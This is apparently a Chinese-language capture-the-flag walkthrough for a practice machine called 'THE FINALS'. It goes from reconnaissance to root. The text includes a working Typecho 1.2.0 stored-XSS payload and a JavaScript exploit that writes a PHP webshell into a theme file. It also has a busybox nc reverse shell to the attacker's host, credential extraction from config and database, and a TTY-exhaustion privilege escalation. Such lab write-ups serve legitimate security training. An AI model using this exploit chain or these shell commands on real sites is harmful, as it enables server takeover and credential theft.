# 一、信息收集

## 1.1 主机发现与端口扫描

首先，使用 `arp-scan` 在本地网络中发现目标主机的 IP 地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                         
...
192.168.205.157 08:00:27:19:f4:ef       PCS Systemtechnik GmbH
...
```

确定目标主机 IP 为 `192.168.205.157`。接着，使用 `nmap` 对其进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.157
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:19:F4:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示，目标主机开放了 22 (SSH) 和 80 (HTTP) 两个端口。

## 1.2 Web 服务探测

访问目标主机的 80 端口，发现是一个名为 "THE FINALS" 的静态网站，页面源码显示这是一个基于模板的网站，没有直接可利用的信息。

使用目录扫描工具 `dirsearch` 进一步探测 Web 服务的目录结构。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.157
...
[10:46:28] 200 -   17KB - /blog/
[10:46:28] 200 -  820B  - /cgi-bin/printenv
[10:46:28] 200 -    1KB - /cgi-bin/test-cgi
...
```

扫描结果发现 `/cgi-bin/printenv` 和 `/cgi-bin/test-cgi` 两个 CGI 脚本，但访问后发现它们只是用于测试的示例脚本，并未执行，没有实际利用价值。

关键发现是 `/blog/` 目录。访问该目录 `http://192.168.205.157/blog/`，发现是一个 Typecho 博客系统。为了方便后续操作，将域名与 IP 绑定到本地 hosts 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts      
192.168.205.157 THEFINALS.hmv
```

通过页面信息和特征判断，该博客系统版本为 Typecho 1.2.0。

# 二、漏洞利用 (Typecho 1.2.0 存储型 XSS)

## 2.1 漏洞分析

查询公开漏洞库可知，Typecho 1.2.0 版本存在一个存储型 XSS 漏洞（参考 issue [#1546](https://github.com/typecho/typecho/issues/1546)。

*   **漏洞成因**：漏洞存在于文章的评论功能中。当用户提交评论时，其填写的个人网站 URL 字段在后端处理和前端渲染时没有进行充分的过滤和编码。
*   **触发原理**：攻击者可以将恶意 JavaScript 代码构造在 URL 字段中。例如，通过闭合前一个 `<a>` 标签并插入一个新的 `<script>` 标签，来注入恶意脚本。当网站管理员在后台管理评论页面（`manage-comments.php`）查看这条恶意评论时，这段 JavaScript 代码就会在管理员的浏览器中执行。
*   **利用思路**：利用这个 XSS 漏洞，我们可以构造一段 JavaScript payload，当管理员查看评论时，该 payload 会在后台自动执行一系列操作，例如修改主题文件（如 `404.php`）并写入一个 webshell，从而实现对服务器的控制。

## 2.2 构造并执行 Payload

根据漏洞原理，我们编写一段 JavaScript payload (`exp.js`)，其功能是：

1.  在管理员后台页面中，动态创建一个不可见的 iframe，加载主题文件 `404.php` 的编辑页面。
2.  在 iframe 加载完成后，通过 `onload` 事件触发 `writeShell()` 函数。
3.  `writeShell()` 函数会定位到 `404.php` 的文本编辑框，将 PHP 一句话木马 `<?php system($_GET["a"]); ?>` 写入文件内容的顶部。
4.  最后，模拟点击“保存文件”按钮，将 webshell 写入到服务器。

```javascript
// exp.js
var isSaved = false;
var attemptCounter = 0;

function insertIframe() {
    var path = window.location.pathname;
    var adminBase = path.includes('manage-comments.php') 
        ? path.replace('manage-comments.php', '') 
        : '/admin/';
    var themeUrl = adminBase + 'theme-editor.php?theme=default&file=404.php';

    var iframe = `<iframe id="theme_id" src="${themeUrl}" width="0" height="0" onload="writeShell()"></iframe>`;
    document.body.innerHTML += iframe;
}

function writeShell() {
    if (isSaved || attemptCounter > 10) return;
    attemptCounter++;

    try {
        var iframeDoc = document.getElementById('theme_id').contentWindow.document;
        var content = iframeDoc.getElementById('content');
        var buttons = iframeDoc.getElementsByTagName('button');

        if (content && buttons.length > 1) {
            var val = content.value;
            var payload = '<?php system($_GET["a"]); ?>\n';
            if (val.indexOf(payload) === -1) {
                content.value = payload + val;
                buttons[1].click();
                isSaved = true;
            }
        }
    } catch (e) {}

    if (!isSaved) {
        setTimeout(writeShell, 500); 
    }
}

insertIframe();
```

接着，在本地（Kali）开启一个 HTTP 服务来托管 `exp.js`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

然后，在博客的文章评论区提交一条恶意评论，其中 "Website" 字段填入我们构造好的 XSS payload，用于加载远程的 `exp.js` 脚本。

```
http://a.com/"></a><script/src="http://192.168.205.128/exp.js"></script><a/href="#
```

当评论提交后，等待一段时间（模拟管理员查看评论），本地 HTTP 服务器会收到来自目标服务器的请求，说明 XSS 已成功触发。

```bash
...
192.168.205.1 - - [24/Aug/2025 10:53:08] "GET /exp.js HTTP/1.1" 200 -
...
```

## 2.3 获取 Webshell 并反弹 Shell

XSS 触发后，webshell 已被写入 `/usr/themes/default/404.php`。我们可以通过访问该文件并传入命令来验证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=id'         
uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)
```

命令成功执行。接下来，在 Kali 上设置 `netcat` 监听，并利用 webshell 执行反弹 shell 命令，获取一个交互式 Shell。

Kali 监听：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888
```

执行反弹 Shell：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20%2Fbin%2Fash'
```

成功获取到 `apache` 用户的 Shell，并升级为稳定的 TTY。

# 三、横向移动

## 3.1 信息搜集

在 `apache` 用户的 Shell 中，首先查看博客的配置文件，获取数据库凭据。

```bash
/var/www/html/blog $ cat config.inc.php
...
$db->addServer(array (
  'host' => 'localhost',
  'port' => 3306,
  'user' => 'typecho_u',
  'password' => 'QLTkbviW71CSRZtGWIQdB6s',
  'database' => 'typecho_db',
...
```

使用获取到的凭据连接数据库，并查询 `typecho_users` 表，找到了 `staff` 用户的密码哈希。尝试破解该哈希未果，判断为兔子洞。

```bash
/var/www/html/blog $ mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s typecho_db -e "select * from typecho_users;"
...
|   1 | staff | $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | ...
...
```

接着，检查 `/home` 目录，发现了 `june`, `scotty`, `staff` 三个用户。在 `/home/june` 目录下发现 `message.txt`，内容提到了 "BROADCAST" 和 "CNS"，这是一个重要线索。

通过 `find` 命令查找属于 `scotty` 用户的文件，发现了日志文件 `/var/log/scotty-main.log`。

```bash
/home/june $ head -n 10 /var/log/scotty-main.log
Broadcast to eth0 192.168.11.255:1337
...
```

日志显示，系统正在向 `192.168.11.255` 的 1337 端口进行 UDP 广播。

## 3.2 流量监听与凭据获取

根据日志文件的线索，在 Kali 上使用 `tcpdump` 监听来自目标主机的流量。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo tcpdump -A host 192.168.205.157
...
E..@..@.@. ............9.,V<LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
```

捕获到了一段 Base64 编码的数据。对其进行解码，发现是一个 SSH 私钥。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '...' | base64 -d > /tmp/id_rsa
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

保存私钥并赋予 `600` 权限。通过 `ssh-keygen` 查看其关联用户，发现是 `root@thefinals.hmv`。然而，尝试使用该私钥以 `root` 身份登录失败。进一步尝试以 `scotty` 用户身份登录，成功。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chmod 600 /tmp/id_rsa
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh scotty@192.168.205.157 -i /tmp/id_rsa

thefinals:~$ id
uid=1002(scotty) gid=100(users) groups=100(users),100(users)
```

成功横向移动到 `scotty` 用户。

# 四、权限提升

## 4.1 Sudo 权限分析

以 `scotty` 用户身份登录后，立即检查 `sudo` 权限。

```bash
thefinals:~$ sudo -l
...
User scotty may run the following commands on thefinals:
    (ALL) NOPASSWD: /sbin/secret
```

`scotty` 用户可以无需密码以 `root` 权限执行 `/sbin/secret`。尝试直接运行该命令。

```bash
thefinals:~$ sudo /sbin/secret
/sbin/secret: line 2: can't create /dev/pts/99: Permission denied
```

程序执行失败，错误信息表明它尝试向 `/dev/pts/99` 这个伪终端（TTY）设备文件写入内容时权限不足。这揭示了提权的关键：我们需要让自己进入 `/dev/pts/99` 这个 TTY 会话。

## 4.2 TTY 占用与提权

系统分配 TTY 编号是顺序的。为了获得 `/dev/pts/99`，我们需要先创建并占用掉从 0 到 98 的所有 TTY。

由于目标系统上没有安装 `screen` 或 `tmux` 等工具，我们选择使用 `python` 的 `pty` 模块来生成新的 TTY 会话。

1. **批量创建后台 TTY**：
   编写一个 `while` 循环，在后台启动 9* 个新的 TTY 会话，以占用 `/dev/pts/0` 到 `/dev/pts/9*`（这里就到一个大概范围，然后查看tty自己微调到98就好了）。

   ```bash
   thefinals:~$ i=0; while [ $i -lt 95 ]; do python -c 'import pty; pty.spawn("/bin/ash")' & i=$((i+1)); done
   ```

*ps:我这肯定是没到98的，自己查看tty进行调整*

1. **创建目标 TTY**：
   现在，再创建一个**前台**的 TTY 会话，这个会话将被分配到编号 `/dev/pts/98`。

   ```bash
   thefinals:~$ python -c 'import pty; pty.spawn("/bin/ash")'
   ~ $ tty
   /dev/pts/98
   ```

   (这里发现需要99个会话，不是98个，故再补上)

2. **获取凭据**：
   在 `/dev/pts/98` (实际为 `/dev/pts/99`，因为从0开始) 的 TTY 中，再次执行 `sudo` 命令。

   ```bash
   ~ $ sudo /sbin/secret
   root:p8RuoQGTtlKLAjuF1Tpy5wX
   ```

   这次命令成功执行，并输出了一对凭据。这看起来像是数据库的 root 用户密码。

## 4.3 获取最终 Root 权限

使用上一步获取的密码尝试连接本地 MySQL/MariaDB 服务。

```bash
~ $ mysql -u root -pp8RuoQGTtlKLAjuF1Tpy5wX secret -e 'select * from user;'
...
+----+----------+-------------------------+
| id | username | password                |
+----+----------+-------------------------+
|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |
+----+----------+-------------------------+
```

在 `secret` 数据库的 `user` 表中，发现了 `root` 用户的密码 `BvIpFDyB4kNbkyqJGwMzLcK`。使用这个密码切换到 `root` 用户。

```bash
~ $ su -
Password: BvIpFDyB4kNbkyqJGwMzLcK
thefinals:~# id
uid=0(root) gid=0(root) groups=0(root),...
```

成功切换到 `root` 用户。最后，读取位于 `/root/root.flag` 和 `/home/june/user.flag` 的两个 flag 文件，完成挑战。

```bash
thefinals:~# cat /root/root.flag
flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}

thefinals:~# cat /home/june/user.flag
flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
```